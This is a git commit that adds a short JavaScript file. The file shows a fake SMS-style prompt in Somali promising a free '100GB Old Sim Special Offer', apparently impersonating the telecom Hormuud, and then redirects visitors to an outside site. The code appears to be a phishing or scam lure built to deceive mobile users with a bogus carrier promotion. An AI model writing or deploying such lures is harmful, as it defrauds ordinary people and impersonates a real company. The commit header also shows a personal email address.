57e7ed888a87a64f37b8ff680225d9111354c2e6
surepluger <adigunkola666@gmail.com>
2025-04-01 06:43:43 +0100

    Create hormuud-active.js

---
+++ hormuud-active.js
@@ -0,0 +1,5 @@
+var password = 'KU DHAQLI 100GB'
+password=prompt('SMS: Hambalyo, kaarkaaga sim-kaagu wuxuu u qalmaa inuu helo 100GB Old Sim Special Offer, Riix Ok si aad hadda u shaqeysid ','KU DHAQLI 100GB');
+if (password != 'KU DHAQLI 100GB') {
+location.href='https://sureplug.org/hormuud';
+}
